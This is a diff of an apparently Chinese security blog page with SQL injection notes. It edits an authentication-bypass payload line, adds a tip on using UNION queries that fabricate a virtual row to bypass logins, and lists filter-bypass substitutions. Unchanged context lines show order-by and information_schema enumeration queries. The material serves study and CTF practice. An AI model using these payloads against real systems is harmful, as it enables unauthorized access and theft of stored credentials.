@@ -625,7 +625,7 @@
       
         <div class="post-detail-header_wordcount">
           <span class="totalcount">
-            <i class="fas fa-file-text-o"></i> 字数统计: 1.4k |
+            <i class="fas fa-file-text-o"></i> 字数统计: 1.5k |
           </span>
   
           <span class="min2read">
@@ -655,7 +655,7 @@
       <div class="post-content">
         <h3 id="一、常见注入方式"><a href="#一、常见注入方式" class="headerlink" title="一、常见注入方式"></a>一、常见注入方式</h3><p>万能密码：</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1&#39; or &#39;1&#39;&#x3D;&#39;1　　　　　　　　#完整语句 select username,age from userinfo where id&#x3D;&#39;&#39; or &#39;1&#39;&#x3D;&#39;1&#39;
-1&#39; or 1&#x3D;1 #　　　　　　　　　#完整语句 select username,age from userinfo where id&#x3D;&#39;&#39; or 1&#x3D;1#&#39;
+1&#39; or 1&#x3D;1#　　　　　　　　　#完整语句 select username,age from userinfo where id&#x3D;&#39;&#39; or 1&#x3D;1#&#39;
 1&#39;&#x3D;0 #　　　　　　　　　　　　#完整语句 select username,age from userinfo where id&#x3D;&#39;&#39;&#x3D;0#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><code>1&#39; order by n</code> 判断字段数，当n回显正常，n+1报错，即n是字段数</p>
@@ -679,6 +679,9 @@ select column_name from information_schema.columns where table_schema&#x3D;datab
 4.查找数据
 select username,passwd from BBB;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p><strong>联合注入有个技巧。在联合查询并不存在的数据时，联合查询就会构造一个 虚拟的数据</strong></p>
+<p><img src="https://s2.loli.net/2022/02/04/K3R7nBP4ZrLTJip.png" class="lazyload placeholder" data-srcset="https://s2.loli.net/2022/02/04/K3R7nBP4ZrLTJip.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p> 如果当前页面有登录的话就可以混淆密码(包括md5密码查询)</p>
 <h4 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2.布尔盲注"></a>2.布尔盲注</h4><blockquote>
 <p>web页面返回值是布尔型，注入后根据页面返回值来得到数据库信息的方法</p>
 </blockquote>
@@ -725,7 +728,7 @@ select username,passwd from BBB;<span aria-hidden="true" class="line-numbers-row
 <li>双重编码</li>
 <li>还有8进制，utf-32，utf-16 等等</li>
 </ul>
-<h5 id="3-关键字替换"><a href="#3-关键字替换" class="headerlink" title="3.关键字替换"></a>3.关键字替换</h5><ul>
+<h5 id="3-关键字替换-也可以考虑php-RCE的绕过方式"><a href="#3-关键字替换-也可以考虑php-RCE的绕过方式" class="headerlink" title="3.关键字替换(也可以考虑php_RCE的绕过方式)"></a>3.关键字替换(也可以考虑php_RCE的绕过方式)</h5><ul>
 <li>空格替换：/**/, () ,Tab代替空格, 0xa0用16进制解码</li>
 <li>and替换：&amp;&amp;</li>
 <li>or替换：||</li>
@@ -830,19 +833,18 @@ select * from news limit 1 offset 0<span aria-hidden="true" class="line-numbers-
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/15.jpg" class="lazyload placeholder" data-srcset="/medias/15.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="/medias/13.jpg" class="lazyload placeholder" data-srcset="/medias/13.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
     </div>
-    <a href="/2021/10/26/BUUCTF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="post-nav-link">
+    <a href="/2021/10/26/Python-Web/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">BUUCTF-随便注</div>
+        <div class="title-text">Python-Web</div>
       </div>
       <!-- <div class="content">
-        简单尝试后，发现是字符型注入，字段为2
-
-尝试使用union注入，发现被过滤，尝试后发现，无法绕过select的过滤
-
-
+        一、python爬虫基础常用方法:
+import requests
+r = requests.get(url)
+r.te
       </div> -->
     </a>
   </div>
